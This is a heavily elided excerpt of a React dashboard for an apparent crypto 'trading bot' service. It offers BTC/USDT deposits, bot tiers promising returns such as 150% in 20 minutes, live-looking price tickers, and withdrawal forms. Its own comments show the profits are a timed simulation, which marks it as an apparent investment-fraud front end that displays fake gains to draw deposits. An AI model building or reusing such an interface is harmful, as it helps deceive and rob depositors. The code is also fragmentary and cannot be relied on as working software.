...
const BOTS = [
  {
    ...
    tickMs: 500,             // 500ms tick → 60s simulation
  ...
  },
  {
    ...
    icon: '👑',
    tag: '20 MIN',
    duration: 1200,          // 20 real minutes
    returnRate: 1.5,         // 150% profit
    risk: 'Premium',
    min: 500,
    max: 9999999,
    color: '#F5C518',
    ...
    tickMs: 1000,            // 1s tick → 20-min simulation
    description: '150% return on premium high-stake positions',
    badge: 'HIGH STAKE',
  },
]

// ── Live ticker base prices ──────────────────────────────────────
const TICKERS_BASE = [
...
export default function Dashboard() {
  ...
  const [activeBotType,setActiveBotType]  = useState<string>('sprint')
  ...
  // Restore bot type from localStorage on session load
  useEffect(() => {
  ...
  useEffect(() => {
    ...
    // Countdown (always 1-second steps)
  ...
  // Auto-fill target profit when amount or bot changes
  useEffect(() => {
  ...
  const handleTrade = async () => {
    ...
    if (newSession?.id) {
      localStorage.setItem(`bot_type_${newSession.id}`, selectedBot.id)
    }
  ...
  return (
    <div style={{ display: 'flex', flexDirection: 'column', height: '100vh', background: G.bg, color: G.text, fontFamily: "-apple-system, BlinkMacSystemFont, 'SF Pro Display', sans-serif", overflow: 'hidden' }}>
      ...
      {/* ══ TICKER BAR ══ */}
      <div style={{ height: 34, background: 'rgba(245,197,24,0.035)', borderBottom: `1px solid ${G.goldBorder}`, display: 'flex', alignItems: 'center', overflow: 'hidden', flexShrink: 0 }}>
        <style>{`
        ...
        <div style={{ display: 'flex', gap: 36, animation: 'ticker 28s linear infinite', whiteSpace: 'nowrap', paddingLeft: '100%' }}>
          {[...tickers, ...tickers].map((t, i) => (
            <span key={i} style={{ display: 'inline-flex', alignItems: 'center', gap: 7, fontSize: 11, fontWeight: 600 }}>
              <span style={{ color: G.muted, fontWeight: 500 }}>{t.sym}/USDT</span>
        ...
        <div style={{ flex: 1, display: 'flex', flexDirection: 'column', overflow: 'hidden' }}>
          ...
          <div style={{ height: 44, borderBottom: `1px solid ${G.border}`, display: 'flex', alignItems: 'center', justifyContent: 'space-between', padding: '0 16px', flexShrink: 0 }}>
            <div style={{ display: 'flex', alignItems: 'center', gap: 10 }}>
              {isMobile && (
                <div style={{ width: 28, height: 28, background: G.goldDim, border: `1px solid ${G.goldBorder}`, borderRadius: 7, display: 'flex', alignItems: 'center', justifyContent: 'center', fontSize: 14 }}>⚡</div>
              )}
              <span style={{ fontSize: 13, fontWeight: 700, color: G.gold, letterSpacing: '0.08em', textTransform: 'uppercase' }}>
                {view === 'home' ? 'Dashboard' : view === 'deposit' ? 'Deposit' : 'Activate Bot'}
              </span>
            </div>
            <div style={{ display: 'flex', alignItems: 'center', gap: 10 }}>
              {balance > 0 && view === 'home' && (
          ...
          <div style={{ flex: 1, overflow: 'auto', padding: isMobile ? '12px 12px 80px' : '20px' }}>
            ...
            {view === 'home' && (
              <div style={{ display: 'flex', flexDirection: 'column', gap: 14 }}>
                ...
                {/* ── Active session card ── */}
                {activeSession ? (
                  <div style={{ background: `linear-gradient(135deg, ${activeBotDef.colorDim} 0%, rgba(0,0,0,0) 60%)`, border: `1px solid ${targetReached ? G.greenText : activeBotDef.colorBorder}`, borderRadius: 16, padding: isMobile ? 16 : 24, position: 'relative', overflow: 'hidden', transition: 'border-color 0.5s' }}>
                    ...
                    <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'flex-start', marginBottom: 16, flexWrap: 'wrap', gap: 8 }}>
                      <div>
                        <div style={{ display: 'flex', alignItems: 'center', gap: 6, marginBottom: 6 }}>
                          ...
                          <span style={{ fontSize: 9, padding: '2px 7px', borderRadius: 4, background: activeBotDef.colorDim, border: `1px solid ${activeBotDef.colorBorder}`, color: activeBotDef.color, fontWeight: 800, letterSpacing: '0.08em' }}>{activeBotDef.tag}</span>
                        </div>
                        <div style={{ fontSize: isMobile ? 26 : 30, fontWeight: 900, letterSpacing: '-0.03em' }}>
                  ...
                  <div style={{ background: G.bg2, border: `1px solid ${G.border}`, borderRadius: 12, padding: 24, textAlign: 'center' }}>
                    ...
                    <div style={{ fontSize: 13, color: G.muted, marginBottom: 14 }}>No active bot session</div>
                  ...
                  {!depositDone ? (
                    <>
                        ...
                        <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 8 }}>
                          {(['BTC', 'USDT'] as const).map(c => (
                            <button key={c} onClick={() => setCurrency(c)}
                              style={{ padding: 14, borderRadius: 10, border: `1px solid ${currency === c ? G.goldBorder : G.border}`, background: currency === c ? G.goldDim : 'transparent', color: currency === c ? G.gold : G.muted, fontWeight: 700, cursor: 'pointer', fontSize: 14 }}>
                              {c === 'USDT' ? '₮ USDT (TRC20)' : '₿ Bitcoin'}
                            </button>
                          ))}
                        </div>
                      </div>
                      <div>
                        ...
                        <div style={{ background: G.bg3, border: `1px solid ${G.goldBorder}`, borderRadius: 10, padding: '14px 16px', fontSize: 11, color: G.gold, wordBreak: 'break-all', letterSpacing: '0.02em', fontFamily: 'monospace' }}>
                      ...
                      <div>
                        ...
                        <input type="number" placeholder="Min. $85" value={depositAmount} onChange={e => setDepositAmount(e.target.value)}
                          style={{ width: '100%', background: G.bg3, border: `1px solid ${G.border}`, borderRadius: 10, padding: '14px 16px', fontSize: 16, color: G.text, outline: 'none', boxSizing: 'border-box' }} />
                        {depositAmount && parseFloat(depositAmount) >= 85 && (
                          <div style={{ fontSize: 12, color: G.greenText, marginTop: 6 }}>
                            Credited: ${(parseFloat(depositAmount) - 1).toFixed(2)} (after $1 fee)
                          </div>
                        )}
                      </div>
                    ...
                    <div style={{ textAlign: 'center', padding: 20 }}>
                      ...
                      <div style={{ fontSize: 13, color: G.muted, marginBottom: 20 }}>Balance updates in 10–30 minutes after confirmation.</div>
            ...
            {view === 'trade' && (
              <div style={{ maxWidth: 560, margin: '0 auto', display: 'flex', flexDirection: 'column', gap: 16 }}>
                ...
                {balance < 50 ? (
                  <div style={{ background: G.bg2, border: `1px solid ${G.border}`, borderRadius: 16, padding: 28, textAlign: 'center' }}>
                    <div style={{ fontSize: 13, color: G.muted, marginBottom: 16 }}>Minimum $50 required to trade.</div>
                    <button onClick={() => setView('deposit')}
                      style={{ background: G.gold, color: '#000', fontWeight: 700, fontSize: 14, padding: '12px 28px', borderRadius: 10, border: 'none', cursor: 'pointer' }}>
                      Deposit Now
                    </button>
                  </div>
                ) : (
                  <>
                    {/* Bot selection cards */}
                    <div>
                      <div style={{ fontSize: 11, color: G.muted, marginBottom: 10, textTransform: 'uppercase', letterSpacing: '0.06em' }}>Choose Your Bot</div>
                      <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 12 }}>
                        {BOTS.map(b => {
                          const isSelected = selectedBot.id === b.id
                          const isLocked   = balance < b.min
                          return (
                            <div key={b.id} onClick={() => !isLocked && setSelectedBot(b)}
                              style={{ padding: isMobile ? 16 : 20, borderRadius: 16, border: `2px solid ${isSelected ? b.color : isLocked ? G.border : 'rgba(255,255,255,0.06)'}`, background: isSelected ? b.colorDim : G.bg3, cursor: isLocked ? 'not-allowed' : 'pointer', opacity: isLocked ? 0.45 : 1, transition: 'all 0.2s', position: 'relative', overflow: 'hidden' }}>

                              {/* Badge */}
                              <span style={{ position: 'absolute', top: 10, right: 10, fontSize: 8, padding: '2px 7px', borderRadius: 4, background: b.colorDim, border: `1px solid ${b.colorBorder}`, color: b.color, fontWeight: 800, letterSpacing: '0.08em' }}>
                                {b.badge}
                              </span>

                              <div style={{ fontSize: isMobile ? 26 : 30, marginBottom: 10 }}>{b.icon}</div>
                              <div style={{ fontSize: 15, fontWeight: 800, color: isSelected ? b.color : G.text, marginBottom: 4 }}>{b.name}</div>
                              <div style={{ fontSize: 11, color: G.muted, marginBottom: 14, lineHeight: 1.5 }}>{b.description}</div>

                              <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'flex-end' }}>
                                <div>
                                  <div style={{ fontSize: isMobile ? 20 : 24, fontWeight: 900, color: b.color, lineHeight: 1 }}>+{b.returnRate * 100}%</div>
                              ...
                              {isLocked && (
                                <div style={{ marginTop: 8, fontSize: 10, color: G.redText }}>🔒 Need ${b.min - Math.floor(balance)} more</div>
                              )}
                            </div>
                          )
                        })}
                    ...
                    {/* Trade form */}
                    <div style={{ background: G.bg2, border: `1px solid ${G.border}`, borderRadius: 16, padding: isMobile ? 18 : 24, display: 'flex', flexDirection: 'column', gap: 16 }}>
                      <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                        <div style={{ fontSize: 16, fontWeight: 700 }}>Configure Trade</div>
                        <div style={{ fontSize: 12, color: G.muted }}>Available: <span style={{ color: G.gold, fontWeight: 700 }}>${balance.toFixed(2)}</span></div>
                      </div>
                      ...
                      <div>
                        ...
                        <input
                          type="number"
                          placeholder={`$${selectedBot.min}${selectedBot.max < 9999999 ? ' – $' + selectedBot.max : '+'}`}
                          value={tradeAmount}
                        ...
                        <div style={{ display: 'flex', gap: 6, marginTop: 8, flexWrap: 'wrap' }}>
                          {[50, 100, 200, 500, 1000].filter(v => v >= selectedBot.min && v <= balance).map(v => (
                      ...
                      {tradeAmount && parseFloat(tradeAmount) >= selectedBot.min && (
                        <div style={{ padding: 16, background: selectedBot.colorDim, border: `1px solid ${selectedBot.colorBorder}`, borderRadius: 12 }}>
                          ...
                          <div style={{ fontSize: 11, color: G.muted, marginTop: 4 }}>
                            in ~{selectedBot.tag} · Total credit: <span style={{ color: G.text, fontWeight: 600 }}>${(parseFloat(tradeAmount) * (1 + selectedBot.returnRate)).toFixed(2)}</span>
                          </div>
                        </div>
                      )}
                      ...
                      <div>
                        ...
                        <input
                          ...
                          style={{ width: '100%', background: G.bg3, border: `1px solid ${G.border}`, borderRadius: 10, padding: '14px 16px', fontSize: 15, color: G.redText, outline: 'none', boxSizing: 'border-box' }}
                        />
                      </div>
      ...
      {/* ══ MOBILE BOTTOM NAV ══ */}
      {isMobile && (
        <div style={{ position: 'fixed', bottom: 0, left: 0, right: 0, height: 62, background: 'rgba(10,10,10,0.97)', borderTop: `1px solid ${G.border}`, backdropFilter: 'blur(12px)', display: 'flex', alignItems: 'center', justifyContent: 'space-around', zIndex: 50 }}>
          {([
            ...
            <div key={n.key} onClick={() => setView(n.key)}
              ...
              <div style={{ fontSize: 20, color: view === n.key ? G.gold : G.muted }}>{n.icon}</div>
              <div style={{ fontSize: 9, color: view === n.key ? G.gold : G.muted, fontWeight: view === n.key ? 700 : 400, textTransform: 'uppercase', letterSpacing: '0.06em' }}>{n.label}</div>
            </div>
          ))}
                  ...
                  <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 8 }}>
                    {(['BTC', 'USDT'] as const).map(n => (
                      <button key={n} onClick={() => { setWithdrawNetwork(n); setWithdrawAddress(''); setAddressError('') }}
                        style={{ padding: 14, borderRadius: 10, border: `1px solid ${withdrawNetwork === n ? G.goldBorder : G.border}`, background: withdrawNetwork === n ? G.goldDim : 'transparent', color: withdrawNetwork === n ? G.gold : G.muted, fontWeight: 700, cursor: 'pointer', fontSize: 13 }}>
                        {n === 'USDT' ? '₮ USDT TRC20' : '₿ Bitcoin'}
                      </button>
                    ))}
                  </div>
                  <div style={{ fontSize: 11, color: G.sec, marginTop: 6 }}>
                    {withdrawNetwork === 'USDT' ? '⚠ TRC20 (Tron) network only' : '⚠ Bitcoin mainnet only'}
                  </div>
                </div>
                <div>
                  ...
                  <input type="number" placeholder="Min. $10" value={withdrawAmount} onChange={e => setWithdrawAmount(e.target.value)}
                    style={{ width: '100%', background: G.bg3, border: `1px solid ${G.border}`, borderRadius: 10, padding: '14px 16px', fontSize: 15, color: G.text, outline: 'none', boxSizing: 'border-box' }} />
                </div>
                <div>
                  ...
                  <input type="text"
                    ...
                    style={{ width: '100%', background: G.bg3, border: `1px solid ${addressError ? G.red : G.border}`, borderRadius: 10, padding: '14px 16px', fontSize: 12, color: G.text, outline: 'none', boxSizing: 'border-box', fontFamily: 'monospace' }} />
